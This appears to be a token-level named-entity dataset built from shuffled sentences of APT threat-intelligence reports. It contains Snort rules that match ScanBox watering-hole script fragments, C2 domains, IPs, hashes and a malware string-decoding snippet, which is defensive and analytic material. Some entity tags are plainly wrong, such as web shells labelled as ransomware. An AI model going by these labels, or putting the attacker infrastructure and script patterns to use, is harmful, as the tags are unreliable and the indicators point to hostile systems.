ACTIONABLE	O
INTELLIGENCE	O

14	O

The	O
only	O
legible	O
,	O
sensible	O
decoy	O
document	O
observed	O
so	O
far	O
is	O
revealing	O
of	O
the	O
interests	O
of	O
at	O
least	O
one	O
of	O
the	O
targets	O
of	O
this	O
campaign	O
:	O
namely	O
the	O
military	O
threat	O
of	O
Pakistan	O
against	O
India	O
and	O
its	O
growing	O
relationships	O
with	O
other	O
countries	O
including	O
China	O
.	O

Recipient	O
visits	O
fake	O
login	O
page	O
Person	O
is	O
asked	O
to	O
authorize	O
and	O
enters	O
credentials	O
.	O

Most	O
times	O
,	O
we	O
are	O
able	O
to	O
detect	O
the	O
threats	O
in	O
no	O
more	O
than	O
a	O
few	O
hours	O
.	O

These	O
are	O
the	O
accounts	O
:	O
Account	O
Name	O
Account	O
Password	O

2	O
.	O

Evasion	O
based	O
on	O
CPU	O
core	O
detection	O

If	O
the	O
value	O
of	O
key	O
is	O
zero	O
,	O
this	O
is	O
a	O
keyless	O
entry	O
and	O
only	O
carries	O
a	O
value	O
.	O
'	O

The	O
Framework	O
enables	O
entities	O
,	O
regardless	O
of	O
size	O
,	O
degree	O
of	O
cyber	O
risk	O
,	O
or	O
cyber	O
sophistication	O
,	O
to	O
apply	O
principles	O
and	O
best	O
practices	O
of	O
risk	O
management	O
to	O
improve	O
the	O
security	O
and	O
resiliency	O
of	O
critical	O
infrastructure	O
.	O

Similarly	O
,	O
the	O
public	O
disclosure	O
of	O
APT12	O
's	O
intrusion	O
at	O
the	O
New	O
York	O
Times	O
also	O
led	O
to	O
only	O
a	O
brief	O
pause	O
in	O
the	O
threat	O
group	O
's	O
activity	O
and	O
immediate	O
changes	O
in	O
TTPs	O
.	O

Jonathan	O
A.P.	O
Marpaung	O
,	O
HoonJae	O
Lee	O

.	O

Figure	O
2	O
:	O
Enable	O
macros	O
One	O
of	O
the	O
malicious	O
XLSM	O
attachments	O
that	O
we	O
observed	O
contained	O
a	O
macro	O
that	O
:	O
1	O
.	O

해당	O
스크립트는	O
인자로	O
입력된	O
주소로부터	O
파일을	O
다운로드한	O
다음	O
5바이트를	O
복구한다	O
.	O

This	O
causes	O
problems	O
during	O
decompilation	O
due	O
to	O
the	O
use	O
of	O
positive	O
stack	O
pointer	O
values	O
.	O

'	O
Lipton	O
,	O
Eric	O
.	O

This	O
assessment	O
should	O
not	O
be	O
considered	O
an	O
attempt	O
to	O
aid	O
or	O
assess	O
in	O
true	O
attribution	O
of	O
the	O
responsible	O
party	O
,	O
but	O
rather	O
an	O
attempt	O
to	O
provide	O
relevant	O
targeting	O
information	O
for	O
analysts	O
to	O
associate	O
with	O
a	O
known	O
activity	O
group	O
or	O
campaign	O
.	O

alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg	O
:	O
'	O
--	O
[	O
PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	B-malware.infosteal
and	O
Targetted	O
Watering	O
Holes	O
Content	O
(	O
plugin_pdf_ie	O
(	O
)	O
)	O
'	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content	O
:	O
'	O
plugin_pdf_ie	O
(	O
)	O
'	O
;	O
classtype	O
:	O
trojan-activity	O
;	O
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html	B-url.normal
;	I-url.normal
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg	O
:	O
'	O
--	O
[	O
PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	B-malware.infosteal
Watering	O
Hole	O
Content	O
(	O
.item	O
(	O
0	O
)	O
.appendChild	O
(	O
iframe_tag	O
)	O
)	O
'	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content:'.item	O
(	O
0	O
)	O
.appendChild	O
(	O
iframe_tag	O
)	O
'	O
;	O
classtype	O
:	O
trojan-activity	O
;	O
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg	O
:	O
'	O
--	O
[	O
PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	B-malware.infosteal
and	O
Targetted	O
Watering	O
Holes	O
Content	O
(	O
var	O
version\	O
;	O
var	O
ax\	O
;	O
var	O
e\	O
;	O
try	O
{	O
axo=new	O
ActiveXObject	O
)	O
'	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content	O
:	O
'	O
var	O
version\	O
;	O
var	O
ax\	O
;	O
var	O
e\	O
;	O
try	O
{	O
axo=new	O
ActiveXObject	O
'	O
;	O
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg	O
:	O
'	O
--	O
[	O
PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	B-malware.infosteal
Watering	O
Hole	O
Content	O
(	O
document.getElementsByTagName	O
(	O
'	O
head	O
'	O
)	O
.item	O
(	O
0	O
)	O
.appendChild	O
(	O
form_tag	O
)	O
\	O
;	O
)	O
'	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content:'document.getElementsByTagName	O
(	O
'	O
head	O
'	O
)	O
.item	O
(	O
0	O
)	O
.appendChild	O
(	O
form_tag	O
)	O
\	O
;	O
'	O
;	O
classtype	O
:	O
trojan-activity	O
;	O
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg	O
:	O
'	O
--	O
[	O
PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	B-malware.infosteal
Watering	O
Hole	O
Content	O
(	O
return	O
(	O
(	O
!	O
a	O
)	O
?	O

cylance.com	B-url.normal
/en_us/blog/the-deception-project-a-new-japanese-centric-threat.html	I-url.normal
In	O
an	O
effort	O
to	O
expose	O
a	O
common	O
problem	O
we	O
see	O
happening	O
in	O
the	O
industry	O
,	O
Cylance®	O
would	O
like	O
to	O
shed	O
some	O
light	O
on	O
just	O
how	O
easy	O
it	O
is	O
to	O
fake	O
attribution	O
.	O

application	O
is	O
likely	O
only	O
the	O
initial	O
iteration	O
of	O
this	O
type	O
of	O
malware	O
.	O

dropper	O
-	O
>	O
wsh	O
script	O
-	O
>	O
wsh	O
script	O
-	O
>	O
info	O
stealer	O
-	O
>	O
more	O
compiled	O
components	O
spearphish	O
-	O
>	O
dropper	O
-	O
>	O
hta	O
checkin	O
-	O
>	O
downloader	O
-	O
>	O
info	O
stealer	O
While	O
a	O
chain	O
of	O
delivery	O
that	O
includes	O
obfuscated	O
scripts	O
within	O
.hta	O
files	O
occurred	O
as	O
far	O
back	O
as	O
2011	O
,	O
the	O
volume	O
appears	O
to	O
have	O
picked	O
up	O
in	O
2014	O
and	O
now	O
2015	O
.	O

If	O
this	O
failed	O
,	O
trilog.exe	O
attempted	O
to	O
write	O
a	O
small	O
'	O
dummy	O
'	O
program	O
to	O
memory	O
.	O

After	O
decoding	O
the	O
parameters	O
,	O
we	O
obtain	O
the	O
IP	O
address	O
,	O
the	O
path	O
and	O
the	O
user	O
agent	O
used	O
to	O
contact	O
the	O
C	O
&	O
C	O
and	O
send	O
back	O
the	O
information	O
about	O
the	O
target	O
system	O
.	O

While	O
you	O
would	O
virtually	O
never	O
see	O
Western	O
intelligence	O
agencies	O
going	O
after	O
the	O
same	O
target	O
without	O
de-confliction	O
for	O
fear	O
of	O
compromising	O
each	O
other	O
's	O
operations	O
,	O
in	O
Russia	O
this	O
is	O
not	O
an	O
uncommon	O
scenario	O
.	O

CNN	O
.	O

C21D7165B25CAF65D7F92FF758C1B5B1	B-hash
skype.servemp3.com	B-url.cncsvr

Forensic	O
artifacts	O
revealed	O
that	O
the	O
attackers	O
persisted	O
on	O
the	O
network	O
for	O
at	O
least	O
a	O
year	O
before	O
Cybereason	O
was	O
deployed	O
.	O

A	O
few	O
times	O
a	O
year	O
the	O
authors	O
compile	O
a	O
new	O
version	O
of	O
a	O
driver	O
file	O
,	O
creating	O
a	O
reference	O
file	O
.	O

The	O
log	O
messages	O
are	O
abbreviated	O
strings	O
that	O
describe	O
specific	O
activities	O
during	O
the	O
execution	O
of	O
the	O
code	O
.	O

It	O
collects	O
most	O
of	O
the	O
available	O
information	O
about	O
the	O
system	O
,	O
transmits	O
it	O
to	O
the	O
C	O
&	O
C	O
server	O
and	O
executes	O
the	O
commands	O
it	O
receives	O
back	O
.	O

This	O
is	O
most	O
likely	O
performed	O
via	O
a	O
social	O
engineering	O
mechanism	O
,	O
i.e.	O
a	O
fake	O
tech	O
support-style	O
call	O
.	O

In	O
this	O
campaign	O
we	O
identified	O
three	O
compromised	O
versions	O
of	O
apps	O
using	O
this	O
trick	O
hosted	O
on	O
the	O
MDM	B-malware.infosteal
server	O
.	O

File	O
size	O
:	O
168776	O
bytes	O

29	O
July	O
2016	O
.	O

Since	O
it	O
is	O
a	O
very	O
long	O
term	O
group	O
,	O
some	O
victims	O
may	O
be	O
impossible	O
to	O
identify	O
now	O
.	O

It	O
is	O
possible	O
that	O
some	O
of	O
the	O
non-Indian	O
IP	O
space	O
requests	O
may	O
artefacts	O
be	O
due	O
to	O
our	O
own	O
research	O
.	O

Keyword	O
searches	O
revealed	O
that	O
there	O
were	O
still	O
files	O
that	O
would	O
be	O
recoverable	O
on	O
the	O
system	O
.	O

Reverse	O
engineering	O
both	O
the	O
word	O
documents	O
(	O
Uri	O
Terror	O
Report.doc	O
&	O
mha-report.doc	O
)	O
exhibited	O
similar	O
behaviour	O
except	O
the	O
minor	O
difference	O
mentioned	O
below	O
.	O

SUSPICIOUS	O
POWERSHELL	O
USAGE	O
(	O
METHODOLOGY	O
)	O
HX	O
Detect	O
XSLM	O
Macro	O
launch	O
Gen:Variant.Application.HackTool.CobaltStrike.1	O
Malware	O
Object	O
Backdoor.BEACON	O
FE_Malformed_RTF	O
Malware.Binary.rtf	O
Malware.Binary	O
Malware.Binary.xlsx	O
Table	O
1	O
:	O
Detection	O
review	O

The	O
original	O
means	O
of	O
infection	O
is	O
unknown	O
,	O
though	O
we	O
believe	O
Dino	B-malware.backdoor
was	O
installed	O
by	O
another	O
program	O
,	O
as	O
it	O
contains	O
an	O
uninstallation	O
command	O
without	O
the	O
corresponding	O
installation	O
procedure	O
.	O

The	O
Islamic	O
Republic	O
has	O
abandoned	O
its	O
typically	O
deliberate	O
and	O
methodical	O
approach	O
to	O
cyber	O
operations	O
on	O
only	O
two	O
known	O
occasions	O
,	O
in	O
2012	O
and	O
in	O
2014	O
,	O
when	O
a	O
quick	O
reactionary	O
response	O
was	O
required	O
.	O

While	O
investigating	O
the	O
malware	O
's	O
uninstall/delete	O
functionality	O
it	O
was	O
determined	O
that	O
malware	O
creates	O
a	O
batch	O
script	O
to	O
delete	O
all	O
its	O
files	O
but	O
before	O
deleting	O
all	O
the	O
files	O
it	O
pings	O
10	O
times	O
to	O
an	O
hard	O
coded	O
IP	O
address	O
180[.]92[.]154[.]176	B-ip.unknown

Figure	O
1	O
.	O

Vulnerability	O

Dino	B-malware.backdoor
contains	O
a	O
custom	O
file	O
system	O
named	O
'	O
ramFS	O
'	O
by	O
its	O
developers	O
.	O

As	O
a	O
result	O
,	O
we	O
've	O
only	O
included	O
recent	O
Dynamic	O
DNS	O
domains	O
that	O
were	O
connected	O
to	O
recently	O
registered	O
infrastructure	O
.	O

3.1	O
.	O

def	O
rolling_xor	O
(	O
buf	O
,	O
key	O
)	O
:	O
out	O
=	O
'	O
'	O
k	O
=	O
0	O
for	O
i	O
in	O
buf	O
:	O
if	O
k	O
==	O
len	O
(	O
key	O
)	O
:	O
k	O
=	O
0	O
out	O
+=	O
chr	O
(	O
ord	O
(	O
i	O
)	O
^	O
ord	O
(	O
key	O
[	O
k	O
]	O
)	O
)	O
k	O
+=	O
1	O
return	O
out	O
req	O
=	O
'	O
p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9I	O
XEJ7OZkvwBZVx1JsrhQ==	O
'	O
unb64	O
=	O
base64.b64decode	O
(	O
req	O
,	O
'	O
+*	O
'	O
)	O
dec	O
=	O
rolling_xor	O
(	O
unb64	O
[	O
16	O
:	O
:	O
]	O
,	O
unb64	O
[	O
0:16	O
]	O
)	O
print	O
dec	O

Last	O
year	O
,	O
malware	O
which	O
purported	O
to	O
be	O
the	O
Tor	B-malware.drop
Browser	I-malware.drop
Bundle	I-malware.drop
was	O
found	O
in	O
the	O
wild	O
.	O

Parser	O
:	O
:inBytes	O
method	O
clientID	O
equals	O
the	O
following	O
sequence	O
of	O
bytes	O
B4	O
B1	O
47	O
BC	O
52	O
28	O
28	O
73	O
1F	O
1A	O
01	O
6B	O
FA	O
72	O
C0	O
73	O
,	O
then	O
the	O
scrambled	O
version	O
is	O
computed	O
using	O
the	O
third	O
parameter	O
(	O
0x10	O
)	O
,	O
which	O
is	O
treated	O
as	O
a	O
DWORD	O
.	O

Information	O
about	O
travel	O
plans	O
and	O
campaign	O
scheduling	O
could	O
provide	O
short-term	O
opportunities	O
for	O
other	O
intelligence	O
operations	O
.	O

Trend	O
Micro	O
disclaims	O
all	O
warranties	O
of	O
any	O
kind	O
,	O
express	O
or	O
implied	O
.	O

Clever	O
investigators	O
may	O
think	O
that	O
they	O
can	O
spot	O
the	O
suspicious	O
file	O
due	O
to	O
the	O
creation	O
date	O
being	O
changed	O
to	O
the	O
same	O
date	O
as	O
the	O
modified	O
date	O
.	O

As	O
far	O
as	O
any	O
of	O
them	O
know	O
,	O
and	O
it	O
stands	O
to	O
reason	O
that	O
they	O
would	O
,	O
there	O
has	O
never	O
been	O
a	O
case	O
of	O
a	O
large-scale	O
attack	O
utilizing	O
numerous	O
zero-day	O
exploits	O
that	O
were	O
so	O
thoroughly	O
mapped	O
in	O
advance	O
before	O
.	O

During	O
our	O
research	O
,	O
we	O
discovered	O
a	O
cached	O
Apache	O
server	O
log	O
for	O
the	O
IP	O
address	O
81.31.47.101	B-ip.unknown
,	O
which	O
is	O
shared	O
hosting	O
.	O

Even	O
the	O
individual	O
Linux	O
modules	O
renamed	O
as	O
'	O
Fysbis	O
'	O
backdoors	O
released	O
in	O
2016	O
were	O
merely	O
modified	O
and	O
reduced	O
portions	O
of	O
recompiled	O
XAgent	B-malware.backdoor
C/C++	O
codebase	O
.	O

The	O
Mac	O
version	O
shares	O
multiple	O
similarities	O
with	O
those	O
designed	O
for	O
other	O
operating	O
systems	O
.	O

Self-extracting	O

A	O
200.63.46.23	B-ip.unknown
4	O
dexterseason.com	B-url.unknown
.	O

Taken	O
together	O
,	O
FinSpy	B-malware.backdoor
servers	O
are	O
currently	O
,	O
or	O
have	O
been	O
present	O
,	O
in	O
25	O
countries	O
.	O

Let	O
them	O
know	O
.	O

This	O
means	O
the	O
security	O
company	O
that	O
releases	O
a	O
detailed	O
report	O
documenting	O
the	O
campaign	O
is	O
aware	O
of	O
it	O
long	O
before	O
the	O
information	O
is	O
made	O
public	O
.	O

The	O
use	O
of	O
an	O
exploit	O
for	O
a	O
security	O
flaw	O
disclosed	O
in	O
December	O
2017	O
and	O
their	O
recent	O
activities	O
suggest	O
Confucius	O
is	O
keenly	O
trailing	O
their	O
targets	O
.	O

Interesting	O
Artifacts	O
and	O
Observations	O

The	O
group	O
has	O
quietly	O
deployed	O
zero-day	O
in	O
the	O
past	O
,	O
effectively	O
spearphished	O
targets	O
,	O
and	O
maintains	O
a	O
modular	O
toolset	O
.	O

FIGURE	O
4	O
:	O
TIMELINE	O
OF	O
COZYDUKE	B-malware.drop
EVOLUTION	O

'	O
How	O
Hackers	O
Broke	O
Into	O
John	O
Podesta	O
and	O
Colin	O
Powell	O
's	O
Gmail	O
Accounts	O
.	O
'	O

delete	O
name	O

Lastly	O
,	O
our	O
research	O
provides	O
an	O
important	O
testimony	O
to	O
the	O
capabilities	O
and	O
working	O
methods	O
of	O
the	O
OceanLotus	O
Group	O
.	O

cleaned.exe	O
cbkp1vpsv1y.exe	O
jnpqmri1aus.exe	O
gzch5y2cyne.exe	O
retn0gzbksd.lnk	O
pktkvkgj4bl.lnk	O
Intelligence	O
agencies	O
succeeding	O
in	O
penetrating	O
Hezbollah.exe	O

Figure	O
6	O
:	O
Pseudo-code	O
for	O
CalculateFunctionHash	O
With	O
these	O
hash	O
values	O
calculated	O
for	O
the	O
DUBNIUM	B-malware.drop
binary	O
,	O
we	O
can	O
compare	O
these	O
values	O
with	O
the	O
hash	O
values	O
from	O
the	O
original	O
OpenSSL	O
library	O
.	O

Analysis	O
details	O
and	O
testing	O
of	O
an	O
available	O
sample	O
of	O
Shamoon	B-malware.unknown
by	O
General	O
Dynamics	O
Fidelis	O
Cybersecurity	O
Solutions	O
researchers	O
revealed	O
that	O
the	O
malware	O
's	O
wipe	O
operations	O
did	O
not	O
overwrite	O
entire	O
disks	O
,	O
but	O
rather	O
overwrote	O
enough	O
to	O
prevent	O
access	O
to	O
the	O
affected	O
file	O
systems	O
,	O
along	O
with	O
substantial	O
amounts	O
of	O
file	O
data	O
.	O

Accevent.exe	O
<	O
-	O
>	O
Microsoft	O
Accessible	O
Event	O
Watcher	O
7.2.0.0	O
event.dll	O
<	O
-	O
>	O
the	O
loader	O
of	O
ssssss.ddd	O
,	O
(	O
Detected	O
as	O
TROJ_ANELLDR	B-malware.backdoor
)	O
ssssss.ddd	O
(	O
lena_http.bin	O
)	O
<	O
-	O
>	O
encrypted	O
BKDR_ANEL	B-malware.backdoor
(	O
Detected	O
as	O
BKDR_ANELENC	B-malware.backdoor
)	O

The	O
email	O
contained	O
a	O
malicious	O
Trojan	O
downloader	O
which	O
the	O
researchers	O
report	O
to	O
have	O
been	O
detected	O
by	O
their	O
Deep	O
Discovery	O
software	O
.	O

0x406ECC	O
:	O
80277F	O
AND	O
BYTE	O
PTR	O
[	O
EDI	O
]	O
,0x7F	O

We	O
can	O
use	O
similar	O
techniques	O
to	O
explore	O
other	O
actors	O
who	O
have	O
the	O
same	O
tasking	O
as	O
Cluster	O
1	O
.	O

It	O
is	O
composed	O
of	O
a	O
DustySky	B-malware.drop
dropper	O
,	O
DustySky	B-malware.drop
core	O
,	O
and	O
the	O
DustySky	B-malware.drop
keylogging	O
component	O
.	O

Several	O
other	O
details	O
have	O
been	O
uncovered	O
which	O
suggest	O
there	O
was	O
possibly	O
at	O
least	O
one	O
further	O
spyware	O
module	O
based	O
on	O
the	O
same	O
platform	O
in	O
2007-2008	O
,	O
and	O
several	O
other	O
programs	O
whose	O
functionality	O
was	O
unclear	O
between	O
2008	O
and	O
2010	O
.	O

These	O
unique	O
traces	O
assisted	O
us	O
in	O
correlating	O
the	O
current	O
wave	O
to	O
past	O
attacks	O
,	O
and	O
may	O
also	O
have	O
some	O
resemblance	O
to	O
attacks	O
related	O
to	O
the	O
Gaza	O
Cybergang	O
APT	O
group	O
.	O

In	O
July	O
,	O
the	O
DCCC	O
announced	O
that	O
it	O
was	O
investigating	O
an	O
ongoing	O
'	O
cybersecurity	O
incident	O
'	O
that	O
the	O
FBI	O
believed	O
was	O
linked	O
to	O
the	O
compromise	O
of	O
the	O
DNC	O
.	O

Stolen	O
certificates	O
and	O
evasion	O

The	O
following	O
figure	O
shows	O
the	O
code	O
that	O
checks	O
for	O
the	O

Decoding	O
the	O
'	O
config.json	O
'	O
file	O
using	O
base64	O
decoder	O
shows	O
that	O
the	O
C2	O
hostname/domain	O
is	O
:	O

00B9FD24	O
25	O
48	O
29	O
48	O
21	O
48	O
24	O
48	O
66	O
48	O
2B	O
48	O
2A	O
48	O
38	O
48	O
%	O
H	O
)	O
H	O
!	O
H	O
$	O
HfH+H*H8H	O
00B9FD34	O
38	O
48	O
26	O
48	O
2D	O
48	O
3F	O
48	O
3B	O
48	O
66	O
48	O
2B	O
48	O
27	O
48	O
8H	O
&	O
H-H	O
?	O
H	O
;	O
HfH+H'H	O
00B9FD44	O
25	O
48	O

Users	O
are	O
granted	O
permission	O
to	O
copy	O
and/or	O
distribute	O
this	O
document	O
in	O
its	O
original	O
electronic	O
form	O
and	O
print	O
copies	O
for	O
personal	O
use	O
.	O

Volume	O
percent	O
of	O
C	O
&	O
C	O
server	O
activity	O
per	O
country	O

A	O
SIS	O
is	O
an	O
autonomous	O
control	O
system	O
that	O
independently	O
monitors	O
the	O
status	O
of	O
the	O
process	O
under	O
control	O
.	O

dns.apasms.com	B-url.unknown
ns.gpass1.org	B-url.unknown
ns1.gpass1.org	B-url.unknown

Execute	O
contents	O
in	O
unlabeled	O
textbox1	O
as	O
a	O
SQL	O
statement	O
and	O
return	O
valid	O
textual	O
data	O
to	O
adversary	O
.	O

To	O
recover	O
or	O
identify	O
the	O
backup	O
VBR	O
a	O
search	O
will	O
need	O
to	O
be	O
run	O
across	O
the	O
image	O
file	O
.	O

We	O
will	O
try	O
to	O
cover	O
them	O
in	O
this	O
publication	O
,	O
but	O
let	O
us	O
first	O
recap	O
the	O
story	O
so	O
far	O
.	O

1	O
.	O

http://demo1.ftpaccess.cc/	B-url.unknown
demo/ad.jpg	I-url.unknown
Other	O
domains	O
associated	O
with	O
Aurora	B-malware.infosteal
.	O

If	O
the	O
two	O
operations	O
are	O
indeed	O
related	O
,	O
this	O
might	O
indicate	O
the	O
group	O
decided	O
it	O
needed	O
to	O
change	O
its	O
TTPs	O
to	O
avoid	O
detection	O
.	O

The	O
network	O
communication	O
between	O
the	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
C2	O
client	O
and	O
a	O
compromised	O
host	O
(	O
server	O
)	O
is	O
AES	O
encrypted	O
using	O
the	O
same	O
string	O
'	O
Mother360	O
'	O
to	O
derive	O
the	O
decryption	O
key	O
.	O

We	O
suspect	O
that	O
the	O
person	O
or	O
persons	O
behind	O
the	O
group	O
are	O
Chinese	O
,	O
due	O
in	O
part	O
to	O
the	O
following	O
findings	O
:	O
.	O

Darkhotel	B-malware.infosteal
now	O
tends	O
to	O
hide	O
its	O
code	O
behind	O
layers	O
of	O
encryption	O
.	O

Visit	O
avast.com	O
English	O
Menu	O
Threat	O
Intelligence	O
Team	O
,	O
21	O
February	O
2018	O

expects	O
an	O
encoded	O
string	O
between	O
a	O
pair	O
of	O
tags	O
in	O
the	O
response	O
.	O

and	O
creates	O
the	O
service	O
'	O
Remote	O
Access	O
Service	O
'	O
,	O
adjusted	O
to	O
execute	O
C:WindowsSystem32vcmon.exe	O
at	O
system	O
startup	O
.	O

In	O
all	O
of	O
these	O
cases	O
,	O
we	O
operate	O
under	O
strict	O
confidentiality	O
rules	O
with	O
our	O
customers	O
and	O
can	O
not	O
reveal	O
publicly	O
any	O
information	O
about	O
these	O
attacks	O
.	O

Thus	O
,	O
contractors	O
must	O
learn	O
to	O
play	O
the	O
game	O
—	O
enough	O
surface-level	O
adherence	O
to	O
the	O
regime	O
's	O
ideology	O
—	O
to	O
gain	O
temporary	O
reprieves	O
from	O
suspicion	O
long	O
enough	O
to	O
be	O
given	O
contracted	O
work	O
.	O

--	O
-	O

A	O
direct	O
trail	O
was	O
established	O
over	O
a	O
period	O
of	O
years	O
that	O
would	O
lead	O
competent	O
researchers	O
to	O
finger	O
CN	O
operators	O
as	O
responsible	O
for	O
this	O
new	O
activity	O
as	O
well	O
.	O

Asruex	B-malware.drop
downloads	O
a	O
DLL	O
,	O
loads	O
it	O
into	O
the	O
memory	O
and	O
executes	O
DLL	O
's	O
export	O
function	O
,	O
Get_CommandProc	O
.	O

Both	O
Diskcoder.C	O
and	O
Win32/Filecoder.AESNI.C	O
used	O
a	O
supply-chain	O
attack	O
as	O
the	O
initial	O
infection	O
vector	O
.	O

After	O
a	O
Skype	O
file	O
transfer	O
concludes	O
,	O
the	O
following	O
file	O
is	O
created	O
:	O
%	O
USERPROFILE	O
%	O
\Local	O
Settings\Temp\smtXX.tmp	O
.	O

Figure	O
11	O
:	O
Encoded	O
string	O
Figure	O
12	O
:	O
First	O
breakpoint	O
Figure	O
13	O
:	O
Breakpoint	O
on	O
0142bfee	O
hit	O
Figure	O
14	O
:	O
Use	O
'	O
a	O
'	O
command	O
to	O
write	O
instructions	O
over	O
the	O
current	O
eip	O
location	O
Figure	O
15	O
:	O
New	O
disassembly	O
code	O
Figure	O
16	O
:	O
Breakpoints	O
and	O
dump	O
of	O
decoded	O
string	O
Figure	O
17	O
:	O
Decoded	O
strings	O

The	O
C2	O
domain	O
was	O
associated	O
with	O
multiple	O
IP	O
addresses	O
in	O
past	O
as	O
shown	O
below	O
During	O
the	O
timeline	O
of	O
this	O
cyber	O
attack	O
most	O
of	O
these	O
IP	O
addresses	O
were	O
located	O
in	O
Pakistan	O
and	O
few	O
IP	O
addresses	O
used	O
the	O
hosting	O
provider	O
infrastructure	O
as	O
shown	O
in	O
the	O
screen	O
shot	O
below	O
Below	O
screenshot	O
shows	O
the	O
timeline	O
when	O
these	O
IP	O
addresses	O
were	O
active	O
.	O

PressReader	O
<	O
infodept@cloudsend[.]net	O
>	O
Angela	O
Suh	O
<	O
angela.suh@cloudsend[.]net	O
>	O
Ashley	O
Safronoff	O
<	O
ashley.safronoff@cloudsend[.]net	O
>	O
Lindsey	O
Hersh	O
<	O
lindsey.hersh@cloudsend[.]net	O
>	O
Sarah	O
Roberto	O
sarah.roberto@cloudsend[.]net	O
noreply@cloudsend[.]net	O
Macron	O
Denies	O
Authenticity	O
Of	O
Leak	O
,	O
French	O
Prosecutors	O
Open	O
Probe	O
Macron	O
Document	O
Leaker	O
Releases	O
New	O
Images	O
,	O
Promises	O
More	O
Information	O
Are	O
Emmanuel	O
Macron	O
's	O
Tax	O
Evasion	O
Documents	O
Real	O
?	O

logins	O
id.pdf	O
id.jpg	O

Differences	O
with	O
regards	O
to	O
Backdoor	O
commands	O
:	O
CMD	O
ID	O
5.0.0	O
beta1/5.1.1	O
rc/5.1.2	O
5.2.0	O
rev1	O
0x97A168D9697D40DD	B-hash
0x7CF812296CCC68D5	B-hash
0x652CB1CEFF1C0A00	B-hash
0x27595F1F74B55278	B-hash
Save	O
File	O
Upload	O
File	O
Load	O
New	O
PE	O
file	O
Save	O
File	O
and	O
Execute	O
If	O
no	O
match	O
above	O
Execute	O
Command	O
or	O
File	O
The	O
differences	O
shown	O
in	O
the	O
table	O
above	O
are	O
subtle	O
but	O
present	O
.	O

The	O
U.S.	O
Government	O
assesses	O
that	O
information	O
was	O
leaked	O
to	O
the	O
press	O
and	O
publicly	O
disclosed	O
.	O

Author	O
:	O

It	O
looks	O
like	O
they	O
took	O
the	O
'	O
Family	O
Planning	O
Association	O
of	O
Bangladesh	O
'	O
and	O
combined	O
it	O
with	O
'	O
Joint	O
Base	O
Andrews	O
.	O
'	O

Once	O
we	O
have	O
decoded	O
the	O
string	O
,	O
further	O
reverse	O
engineering	O
becomes	O
trivial	O
.	O

PCC_SOCK	O
is	O
an	O
abstraction	O
for	O
the	O
communication	O
subsystem	O
.	O

Once	O
invoked	O
,	O
trilog.exe	O
checked	O
the	O
status	O
of	O
the	O
controller	O
,	O
then	O
read	O
the	O
configuration	O
information	O
exposed	O
by	O
the	O
TriStation	O
protocol	O
.	O

The	O
domain	O
name	O
java-se.com	B-url.normal
is	O
known	O
bad	O
and	O
associated	O
with	O
APT	O
activity	O
.	O

Compare	O
that	O
to	O
other	O
Web	B-malware.ransom
shells	I-malware.ransom
such	O
as	O
Laudanum	O
(	O
619	O
bytes	O
)	O
or	O
RedTeam	O
Pentesting	O
(	O
8,527	O
bytes	O
)	O
.	O

KIDA	O
is	O
organized	O
into	O
seven	O
research	O
centers	O
:	O
the	O
Center	O
for	O
Security	O
and	O
Strategy	O
;	O
the	O
Center	O
for	O
Military	O
Planning	O
;	O
the	O
Center	O
for	O
Human	O
Resource	O
Development	O
;	O
the	O
Center	O
for	O
Resource	O
Management	O
;	O
the	O
Center	O
for	O
Weapon	O
Systems	O
Studies	O
;	O
the	O
Center	O
for	O
Information	O
System	O
Studies	O
;	O
and	O
the	O
Center	O
for	O
Modeling	O
and	O
Simulation	O
.	O

All	O
rights	O
reserved	O
.	O

case	O
'	O
l	O
'	O
:	O

By	O
GReAT	O
on	O
February	O
9	O
,	O
2016	O
.	O

Since	O
Win32/Filecoder.AESNI.C	O
did	O
n't	O
spread	O
so	O
widely	O
,	O
we	O
mistakenly	O
assumed	O
that	O
these	O
techniques	O
were	O
used	O
in	O
this	O
case	O
.	O

Some	O
of	O
the	O
key	O
obfuscation	O
techniques	O
used	O
are	O
:	O
Character	O
Replacement	O
